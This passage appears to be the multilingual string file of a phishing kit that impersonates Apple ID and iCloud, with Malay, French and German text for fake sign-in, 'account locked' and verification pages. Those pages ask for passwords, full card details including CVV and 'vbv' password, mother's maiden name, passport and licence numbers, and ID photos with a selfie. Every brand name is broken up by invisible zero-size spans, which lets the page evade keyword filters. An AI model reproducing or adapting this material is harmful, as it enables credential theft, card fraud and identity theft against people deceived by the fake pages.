	$Backside = " - Back side of your ID document";
	$residencephoto = " - Proof of residence document photo";

// Id 2
    $sidespaymentcard = "Upload photos of both sides of your payment card.&nbsp;";
	$Email = " Email";
	$FrontsideCard = " - Front side of your Payment Card";
	$syourideBack = " - Back side of your Payment Card";
	$Email = "";
	$Email = "";
	
	$clearCard = "-Sila muat naik gambar jelas kad pengenalan anda"; 
$takeselfie = "-anda perlu memegang ID anda di sebelah wajah anda dan mengambil selfie yang"; 
$thenupload = "Pilih gambar kemudian klik upload."; 
$uploadii = "muat naik &rarr;"; 
	
// Fin

    $VerificationComplete = "Pengesahan Akaun Selesai";
    $accessaccount = "Sila tunggu sementara kami memulihkan akses akaun anda ...";
    $automaticallylogged = "Untuk keselamatan anda, anda secara automatik akan dilog keluar. ";
	
	// Link Email

    $vverrmail = "Tambah alamat e-mel anda.";
	$emaillsz = "Email";
	$VerificationComplete = "Pengesahan Akaun Selesai";
	$wontsy = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> tidak akan menyimpan kata laluan anda.";
	$iCloud = "Masuk ke <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div>";
    $KeepMe = "Simpan saya masuk";

break;

case "FR":
    $nxt = "Suivant";
	// Front page	
    $TTLEZ = "S'identifier";
	$SignIn = "Se connecter";
	$Createapid = "Créez votre identifiant <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$ForgotApple = "Identifiant <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ou mot de passe oublié?";
	$accounteverything = "Votre compte pour tout <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>.";
	$services = "Un identifiant <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> unique et un mot de passe vous donnent accès à tous les services <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>.";
	$about = "En savoir plus sur <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID&nbsp;";
	$CreateApple = "Créez votre identifiant <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$Shopthe = "Magasinez le ";
	$OnlineStore = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Store en ligne";
	$visit = " visiter un ";
	$RetailStore = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Store";
	$find = " ou trouver un ";
	$reseller = "revendeur";
	$AppleInfo = "Infos <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$Map = "Plan du site";
	$News = "Nouvelles";
	$Feeds = "Flux RSS";
	$Contact = "Contactez nous";
	$rightsreserved = "Copyright © 2019 <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Inc. Tous droits réservés.";
	$TermsUse = "Conditions d'utilisation";
	$Policy = "Politique de confidentialité";
	
// Login page
	
	$accManageount = "Gérez votre compte <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>. Identifiant <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$acApplecount = "Gérez votre compte <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$Password = "Mot de passe";
	$Rmeemember = "Souviens-toi de moi";
	$morehelp = "Besoin d'aide? ";
	$Chatnow = "Besoin d'aide?";
	$M800YAPPLE = " ou appelez le 1-800-<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>.";
	$cfasterheckout = "Connectez-vous pour un paiement plus rapide.";
	$iCsaddressignloud = "Votre identifiant <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> est l'adresse de messagerie que vous utilisez pour vous connecter à <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>T<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>29dc13fd93be42de3a3f632dc2daf8ab</span>n<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>e<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>s</div>, à l'App Store et à <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div>.";
	$ISignn = "Se connecter";
	$pForgotassword = "Vous avez oublié votre identifiant <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ou votre mot de passe?";
	$unpassworddefined = "Vous avez oublié votre identifiant <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ou votre mot de passe? indéfini";
	$Creatonee = "Vous n'avez pas d'identifiant <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>? Créez-en un maintenant.";
	$haveCApplereate = "Vous n'avez pas d'identifiant <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>? Créez-en un maintenant. indéfini";
	$IApplesD = "identifiant <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>";
	$fAqqq = "FAQ"; // added new

// Lock	page

	$securityreasons = " Cet identifiant <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> a été verrouillé pour des raisons de sécurité.";
	$beforesigning = "Vous devez déverrouiller votre compte avant de vous connecter.";
	$UnlockAccount = "Déverrouiller compte";
	
// Verify page

    $yourinformation = "Confirmez vos informations";
	$AccountVerification = "Vérification de compte";
	$YourAppleID = "Votre identifiant <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> est ";
	$OuSignt = "Déconnexion ";
	$PersonalInformation = "Informations personnelles";
	$NAME = "prénom";
	$firstname = "Prénom";
	$middlename = "Prénom (facultatif)";
	$lastname = "nom de famille";
	$OFBIRTH = "DATE DE NAISSANCE";
	$dateobirth = "date de naissance";
	$TELEPHONE = "TÉLÉPHONE";
	$ADDRESS = "ADRESSE";
    $LineADDRESS = "adresse ligne ";
	$city = "ville";
	$POSTCO = "CODE POSTAL";
	$AccountDetails = "details du compte";
	$CARDDETAILS = "Détails de la carte";
	$CAname = "Nom du titulaire de la carte";
	$CAnumber = "Numéro de carte";
	$CAdater = "date d'expiration";
	$securitycode = "code de sécurité de la carte";
	$cardpassword = "mot de passe vbv ou mot de passe de la carte";
	$Security = "Sécurité";
	$SELECTQUESTION = "Selectionnez une question de sécurité";
	$securityquestion = "sélectionnez une question de sécurité";
	$MaideNamen = "Nom de jeune fille de la mère";
	$LicenseNumber = "Numéro de permis de conduire";
	$PassportNumber = "Numéro de passeport";
	$answer = "réponse";

// Id 1

	$IdentityVerification = "vérification d'identité";
	$doIDcument = "1 - Téléchargez des photos des deux côtés de votre document d’identité.";
	$residencedocument = "2 - Télécharger une preuve de résidence document photo";
	$couldyour = "Cela pourrait être votre:";
	$billinternet = "Relevé bancaire ou facture d'électricité (facture d'électricité, d'eau, d'internet, etc.)";
	$Email = " Email";
	$fsidedocument = " - recto de votre document d'identité";
	$Backside = " - Verso de votre pièce d'identité";
	$residencephoto = " - preuve de résidence document photo";

// Id 2
    $sidespaymentcard = "Téléchargez des photos des deux côtés de votre carte de paiement.&nbsp;";
	$Email = " Email";
	$FrontsideCard = " - recto de votre carte de paiement";
	$syourideBack = " - Verso de votre carte de paiement";
	$Email = "";
	$Email = "";
	
	$clearCard = "-s'il vous plaît télécharger une photo claire de votre carte d'identité"; 
$takeselfie = "-vous devez tenir votre ID à côté de votre visage et prendre un selfie"; 
$thenupload = "choisissez la photo puis cliquez sur upload."; 
$uploadii = "upload &rarr;"; 
	
// Fin

    $VerificationComplete = "Vérification du compte terminée";
    $accessaccount = "Veuillez patienter pendant que nous restaurons l'accès à votre compte ...";
    $automaticallylogged = "Pour votre sécurité, vous serez automatiquement déconnecté. ";
	
	// Link Email

    $vverrmail = "Add your email address.";
	$emaillsz = "Email";
	$VerificationComplete = "Account Verification Complete";
	$wontsy = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ne stockera pas votre mot de passe.";
	$itoCloud = "Connectez-vous à <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div>";
    $Keepme = "Me garder connecté";

break;

case "DE":
	// Front page	
	$nxt = "Weiter";
    $TTLEZ = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>S<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>g<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>n<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span> <span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>I<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$sinsg</span>n</div>";
	$SignIn = "Einloggen";
	$Createapid = "Erstellen Sie Ihre <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-ID";
	$ForgotApple = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-ID oder Kennwort vergessen?";
	$accounteverything = "Ihr Konto für alles für <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>.";
	$services = "Mit einer einzigen <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID und einem Kennwort haben Sie Zugriff auf alle <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Dienste.";
	$about = "Weitere Informationen zu <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID&nbsp;";
	$CreateApple = "Erstellen Sie Ihre <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID";
	$Shopthe = "Shop die ";
	$OnlineStore = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Online Store";
	$visit = " besuchen sie eine ";
	$RetailStore = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Retail Store";
	$find = " oder finde einen ";
	$reseller = "Wiederverkäufer";
	$AppleInfo = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Info";
	$Map = "Seitenverzeichnis";
	$News = "Heiße Neuigkeiten";
	$Feeds = "RSS-Feeds";
	$Contact = "Kontaktiere uns";
	$rightsreserved = "Copyright © 2019 <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> Inc. All rights reserved.";
	$TermsUse = "Nutzungsbedingungen";
	$Policy = "Datenschutz-Bestimmungen";
	
// Login page
	
	$accManageount = "Verwalten Sie Ihre <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-Konto <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID";
	$acApplecount = "Verwalten Sie Ihr <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-Konto";
	$Password = "Passwort";
	$Rmeemember = "Erinnere dich an mich";
	$morehelp = "Benötigen Sie weitere Hilfe? ";
	$Chatnow = "Chatte jetzt";
	$M800YAPPLE = " oder rufen Sie 1-800-MY-<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> an.";
	$cfasterheckout = "Melden Sie sich für eine schnellere Kasse an.";
	$iCsaddressignloud = "Ihre <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-ID ist die E-Mail-Adresse, mit der Sie sich bei <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>T<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>29dc13fd93be42de3a3f632dc2daf8ab</span>n<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>e<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$itoot</span>s</div>, dem App Store und <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>i<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>C<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>o<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>u<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>d</div> anmelden.";
	$ISignn = "Einloggen";
	$pForgotassword = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID oder Passwort vergessen?";
	$unpassworddefined = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID oder Passwort vergessen? nicht definiert";
	$Creatonee = "Sie haben keine <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID? Erstellen Sie jetzt einen.";
	$haveCApplereate = "Sie haben keine <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID? Erstellen Sie jetzt einen. nicht definiert";
	$IApplesD = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID";
	$fAqqq = "FAQ"; // added new

// Lock	page

	$securityreasons = " Diese <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div>-ID wurde aus Sicherheitsgründen gesperrt.";
	$beforesigning = "Sie müssen Ihr Konto entsperren, bevor Sie sich anmelden.";
	$UnlockAccount = "Konto entsperren";
	
// Verify page

    $yourinformation = "Bestätigen Sie Ihre Angaben";
	$AccountVerification = "Bestätigung des Kontos";
